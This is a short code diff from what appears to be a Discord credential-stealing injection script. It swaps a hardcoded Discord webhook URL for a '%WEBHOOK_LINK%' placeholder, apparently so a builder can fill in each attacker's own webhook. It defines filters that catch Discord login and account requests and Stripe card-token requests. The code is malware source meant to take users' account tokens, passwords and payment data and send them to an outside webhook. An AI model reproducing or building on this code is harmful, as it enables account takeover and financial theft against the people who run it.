@@ -6,7 +6,7 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "https://canary.discord.com/api/webhooks/1052340314855186432/0XQ9GQAALFJmiwn88CTv-2f2-jNsVmBbTDNL_lDw0tu8mDvoRCu3ZOg-ERYXQoLXWEVA"
+const webhook = "%WEBHOOK_LINK%"
 const Filters = {
     1: {
         urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
